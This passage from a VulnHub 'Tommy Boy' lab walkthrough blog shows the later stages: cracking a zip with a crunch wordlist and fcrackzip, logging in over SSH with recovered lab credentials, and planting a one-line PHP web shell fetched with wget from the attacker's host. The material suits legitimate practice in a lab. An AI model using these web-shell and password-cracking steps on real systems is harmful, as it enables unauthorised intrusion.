<p>Here is also an encrypted backup zip file <code>t0msp4ssw0rdz.zip</code> and also a hint file which including the clues about password:</p>

<p><img class="left" src="/downloads/tommyboy1/10.png"></p>

<p>Password information:</p>

<ul>
<li>start with <code>bev</code></li>
<li>one uppercase character</li>
<li>two numbers</li>
<li>two lowercase characters</li>
<li>one symbol</li>
<li>1955</li>
</ul>


<p><font color="red"><code>bev[A-Z][0-9][0-9][a-z][a-z][symbol]1955</code></font></p>

<p>Then I use <code>crunch</code> to generate a <a href="http://www.liatsisfotis.com/2013/02/create-wordlists-using-crunch.html" title="Create wordlists using crunch">dictionary list</a> with given pattern:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# crunch <span class="m">13</span> <span class="m">13</span> -t bev,%%@@^1995 -o pass_dict.lst
</span><span class='line'>Crunch will now generate the following amount of data: <span class="m">812011200</span> bytes
</span><span class='line'><span class="m">774</span> MB
</span><span class='line'><span class="m">0</span> GB
</span><span class='line'><span class="m">0</span> TB
</span><span class='line'><span class="m">0</span> PB
</span><span class='line'>Crunch will now generate the following number of lines: <span class="m">58000800</span>
</span><span class='line'>
</span><span class='line'>crunch:  27% completed generating output
</span><span class='line'>
</span><span class='line'>crunch:  53% completed generating output
</span><span class='line'>
</span><span class='line'>crunch:  83% completed generating output
</span><span class='line'>
</span><span class='line'>crunch: 100% completed generating output
</span></code></pre></td></tr></table></div></figure>


<p>Then use <code>fcrackzip</code> with the generated dictionary file to crack the encrypted store zip file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# fcrackzip -v -D -u -p pass_dict.lst t0msp4ssw0rdz.zip
</span><span class='line'>found file <span class="s1">&#39;passwords.txt&#39;</span>, <span class="o">(</span>size cp/uc    332/   641, flags 9, chk 9aad<span class="o">)</span>
</span><span class='line'>checking pw bevG72kn~1995
</span><span class='line'>
</span><span class='line'>PASSWORD FOUND!!!!: <span class="nv">pw</span> <span class="o">==</span> bevH00tr<span class="nv">$1995</span>
</span></code></pre></td></tr></table></div></figure>


<p>The password is <font color="red"><code>bevH00tr$1995</code></font> and the unzipped file is <font color="red"><code>password.txt</code></font></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# cat passwords.txt
</span><span class='line'>Sandusky Banking Site
</span><span class='line'>------------------------
</span><span class='line'>Username: BigTommyC
</span><span class='line'>Password: money
</span><span class='line'>
</span><span class='line'>TheKnot.com <span class="o">(</span>wedding site<span class="o">)</span>
</span><span class='line'>---------------------------
</span><span class='line'>Username: TomC
</span><span class='line'>Password: wedding
</span><span class='line'>
</span><span class='line'>Callahan Auto Server
</span><span class='line'>----------------------------
</span><span class='line'>Username: bigtommysenior
</span><span class='line'>Password: fatguyinalittlecoat
</span><span class='line'>
</span><span class='line'>Note: after the <span class="s2">&quot;fatguyinalittlecoat&quot;</span> part there are some numbers, but I don<span class="err">&#39;</span>t remember what they are.
</span><span class='line'>However, I wrote myself a draft on the company blog with that information.
</span><span class='line'>
</span><span class='line'>Callahan Company Blog
</span><span class='line'>----------------------------
</span><span class='line'>Username: bigtom<span class="o">(</span>I think?<span class="o">)</span>
</span><span class='line'>Password: ???
</span><span class='line'>Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.
</span></code></pre></td></tr></table></div></figure>


<p>After login to the blog as Big Tom by using the password found previously in <code>wpscan</code> stage, I noticed that there is a draft post:</p>

<p><img class="left" src="/downloads/tommyboy1/11.png"></p>

<p>Now I got the Server SSH login password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Callahan Auto Server
</span><span class='line'>----------------------------
</span><span class='line'>Username: bigtommysenior
</span><span class='line'>Password: fatguyinalittlecoat1938!!
</span></code></pre></td></tr></table></div></figure>


<p>Login to SSH as Big Tom:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# ssh bigtommysenior@10.1.1.141
</span><span class='line'>The authenticity of host <span class="s1">&#39;10.1.1.141 (10.1.1.141)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">ECDSA key fingerprint is SHA256:bI4/w4tR6j1XRyuLkIs5icsyLJM0Kfw9m4iPFpXX0NI.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span>10.1.1.141<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
</span><span class='line'><span class="s1">bigtommysenior@10.1.1.141&#39;</span>s password:
</span><span class='line'>Welcome to Ubuntu 16.04 LTS <span class="o">(</span>GNU/Linux 4.4.0-36-generic x86_64<span class="o">)</span>
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'><span class="m">112</span> packages can be updated.
</span><span class='line'><span class="m">0</span> updates are security updates.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Last login: Thu Jul <span class="m">14</span> 13:45:57 2016
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>bigtommysenior<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>bigtommysenior<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>bigtommysenior<span class="o">)</span>
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>uname -a
</span><span class='line'>Linux CallahanAutoSrv01 4.4.0-36-generic <span class="c">#55-Ubuntu SMP Thu Aug 11 18:01:55 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/home/bigtommysenior
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>ls -la
</span><span class='line'>total 40
</span><span class='line'>drwxr-x--- <span class="m">4</span> bigtommysenior bigtommysenior <span class="m">4096</span> Jul  <span class="m">8</span> 08:57 .
</span><span class='line'>drwxr-xr-x <span class="m">5</span> root           root           <span class="m">4096</span> Jul  <span class="m">7</span> 00:17 ..
</span><span class='line'>-rw------- <span class="m">1</span> bigtommysenior bigtommysenior    <span class="m">0</span> Jul <span class="m">21</span> 17:47 .bash_history
</span><span class='line'>-rw-r--r-- <span class="m">1</span> bigtommysenior bigtommysenior  <span class="m">220</span> Jul  <span class="m">7</span> 00:12 .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> bigtommysenior bigtommysenior <span class="m">3771</span> Jul  <span class="m">7</span> 00:12 .bashrc
</span><span class='line'>drwx------ <span class="m">2</span> bigtommysenior bigtommysenior <span class="m">4096</span> Jul  <span class="m">7</span> 00:16 .cache
</span><span class='line'>-rw-r--r-- <span class="m">1</span> bigtommysenior bigtommysenior  <span class="m">307</span> Jul  <span class="m">7</span> 14:18 callahanbak.bak
</span><span class='line'>-rw-rw-r-- <span class="m">1</span> bigtommysenior bigtommysenior  <span class="m">237</span> Jul  <span class="m">7</span> 15:27 el-flag-numero-quatro.txt
</span><span class='line'>-rw-rw-r-- <span class="m">1</span> bigtommysenior bigtommysenior  <span class="m">630</span> Jul  <span class="m">7</span> 17:59 LOOT.ZIP
</span><span class='line'>drwxrwxr-x <span class="m">2</span> bigtommysenior bigtommysenior <span class="m">4096</span> Jul  <span class="m">7</span> 13:50 .nano
</span><span class='line'>-rw-r--r-- <span class="m">1</span> bigtommysenior bigtommysenior  <span class="m">675</span> Jul  <span class="m">7</span> 00:12 .profile
</span><span class='line'>-rw-r--r-- <span class="m">1</span> bigtommysenior bigtommysenior    <span class="m">0</span> Jul  <span class="m">7</span> 00:17 .sudo_as_admin_successful
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<h3>The 4th Flag</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>cat el-flag-numero-quatro.txt
</span><span class='line'>YAY!  Flag <span class="m">4</span> out of 5!!!! And you should now be able to restore the Callhan Web server to normal
</span><span class='line'>working status.
</span><span class='line'>
</span><span class='line'>Flag data: EditButton
</span><span class='line'>
</span><span class='line'>But...but...where<span class="s1">&#39;s flag 5?  </span>
</span><span class='line'>
</span><span class='line'><span class="s1">I&#39;</span>ll make it easy on you.  It<span class="err">&#39;</span>s in the root of this server at /5.txt
</span></code></pre></td></tr></table></div></figure>


<p>Then doing the restoring the web site from backup, I got he server back online again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>cp callahanbak.bak /var/www/html/index.html
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>ls -l /var/www/html/index.html
</span><span class='line'>-rw-r--r-- <span class="m">1</span> bigtommysenior bigtommysenior <span class="m">307</span> Sep  <span class="m">5</span> 07:16 /var/www/html/index.html
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>cat /var/www/html/index.html
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;title&gt;Welcome to Callahan Auto&lt;/title&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;H1&gt;&lt;center&gt;Welcome to Callahan Auto!&lt;/center&gt;&lt;/H1&gt;
</span><span class='line'>&lt;font <span class="nv">color</span><span class="o">=</span><span class="s2">&quot;0000ff&quot;</span>&gt;&lt;H2&gt;&lt;center&gt;SYSTEM STATUS: ONLINE&lt;/center&gt;&lt;/H2&gt;&lt;/font&gt;
</span><span class='line'>&lt;H3&gt;We<span class="err">&#39;</span>re happy to be serving all your brakepad needs.&lt;/H3&gt;
</span><span class='line'>&lt;p&gt;
</span><span class='line'>&lt;center&gt;&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;ca.jpeg&quot;</span>&gt;&lt;/center&gt;
</span><span class='line'>&lt;p&gt;
</span><span class='line'>&lt;p&gt;
</span><span class='line'>&lt;/html&gt;
</span><span class='line'>&lt;!----&gt;
</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="/downloads/tommyboy1/12.png"></p>

<p>By doing enumeration and found the following world-writable folders:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bigtommysenior@CallahanAutoSrv01:/var/www/html<span class="nv">$ </span>find / -perm -222 -type d 2&gt;/dev/null
</span><span class='line'>/var/lib/php/sessions
</span><span class='line'>/var/crash
</span><span class='line'>/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads
</span><span class='line'>/var/tmp
</span><span class='line'>/dev/mqueue
</span><span class='line'>/dev/shm
</span><span class='line'>/run/lock
</span><span class='line'>/tmp
</span><span class='line'>/tmp/.XIM-unix
</span><span class='line'>/tmp/.Test-unix
</span><span class='line'>/tmp/.font-unix
</span><span class='line'>/tmp/.ICE-unix
</span><span class='line'>/tmp/.X11-unix
</span></code></pre></td></tr></table></div></figure>


<p>Now upload single-line php shell to the writable folder <font color="red"><code>/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads</code></font> and name it to <code>sh.php</code></p>

<p>The PHP shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/var/www/html# cat shell.php
</span><span class='line'>&lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span> ?&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Upload it to target:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bigtommysenior@CallahanAutoSrv01:/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads<span class="nv">$ </span>wget http://10.1.1.132/shell.php -O sh.php
</span><span class='line'>--2016-09-05 07:38:35--  http://10.1.1.132/shell.php
</span><span class='line'>Connecting to 10.1.1.132:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... <span class="m">200</span> OK
</span><span class='line'>Length: 31
</span><span class='line'>Saving to: ‘sh.php’
</span><span class='line'>
</span><span class='line'>sh.php                                              100%<span class="o">[================================================================================================================</span>&gt;<span class="o">]</span>      <span class="m">31</span>  --.-KB/s    in 0s
</span><span class='line'>
</span><span class='line'>2016-09-05 07:38:35 <span class="o">(</span>6.03 MB/s<span class="o">)</span> - ‘sh.php’ saved <span class="o">[</span>31/31<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads<span class="nv">$ </span>ls -la
</span><span class='line'>total 20
</span><span class='line'>drwxrwxrwx <span class="m">2</span> www-data       www-data       <span class="m">4096</span> Sep  <span class="m">5</span> 07:38 .
</span><span class='line'>drwxr-xr-x <span class="m">3</span> www-data       www-data       <span class="m">4096</span> Jul <span class="m">15</span> 12:47 ..
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root           root            <span class="m">243</span> Jul <span class="m">15</span> 12:23 .htaccess
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root           root            <span class="m">447</span> Jul <span class="m">15</span> 12:32 index.html
</span><span class='line'>-rw-rw-r-- <span class="m">1</span> bigtommysenior bigtommysenior   <span class="m">31</span> Aug <span class="m">24</span> 06:43 sh.php
</span></code></pre></td></tr></table></div></figure>


<h3>The 5th Flag</h3>

<p>Found the 5th flag file:</p>

<p><img class="left" src="/downloads/tommyboy1/13.png"></p>

<p>The 5th flag is <font color="red">Buttcrack</font></p>

<p>Ok now blob all the flag together to make the password: <font color="red"><code>B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack</code></font></p>

<p>Great, now to open the <code>LOOT.ZIP</code> file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>unzip LOOT.ZIP
</span><span class='line'>Archive:  LOOT.ZIP
</span><span class='line'><span class="o">[</span>LOOT.ZIP<span class="o">]</span> THE-END.txt password:
</span><span class='line'>  inflating: THE-END.txt
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>ls
</span><span class='line'>callahanbak.bak  el-flag-numero-quatro.txt  LOOT.ZIP  THE-END.txt
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>cat THE-END.txt
</span><span class='line'>YOU CAME.
</span><span class='line'>YOU SAW.
</span><span class='line'>YOU PWNED.
</span><span class='line'>
</span><span class='line'>Thanks to you, Tommy and the crew at Callahan Auto will make 5.3 cajillion dollars this year.
</span><span class='line'>
</span><span class='line'>GREAT WORK!
</span><span class='line'>
</span><span class='line'>I<span class="s1">&#39;d love to know that you finished this VM, and/or get your suggestions on how to make the next </span>
</span><span class='line'><span class="s1">one better.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">Please shoot me a note at 7ms @ 7ms.us with subject line &quot;Here comes the meat wagon!&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="s1">Or, get in touch with me other ways:</span>
</span><span class='line'>
</span><span class='line'><span class="s1">* Twitter: @7MinSec</span>
</span><span class='line'><span class="s1">* IRC (Freenode): #vulnhub (username is braimee)</span>
</span><span class='line'>
</span><span class='line'><span class="s1">Lastly, please don&#39;</span>t forget to check out www.7ms.us and subscribe to the podcast at
</span><span class='line'>bit.ly/7minsec
</span><span class='line'>
</span><span class='line'>&lt;/shamelessplugs&gt;
</span><span class='line'>
</span><span class='line'>Thanks and have a blessed week!
</span><span class='line'>
</span><span class='line'>-Brian Johnson
</span><span class='line'><span class="m">7</span> Minute Security
</span></code></pre></td></tr></table></div></figure>


<p>Hooooo, finally, Got it!!</p>

<!--- Reference -->



</div>


<div class="meta">
	<div class="date">




2016-09-13 07:40:53 -0400</div>
	

<div class="tags">

	<a class='category' href='/blog/categories/tommy-boy/'>tommy_boy</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>

</div>


	
</div></article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
	
	
	<a class="addthis_button_tweet"></a>
	
	
<!---	<a class="addthis_counter addthis_pill_style"></a> --->
	</div>
  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
</div>


</div>
	<footer id="footer" class="inner">Copyright &copy; 2017

    <font color="green">F4l13n5n0w</font>

<br>
Powered by Octopress.
</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->






</body>
</html>
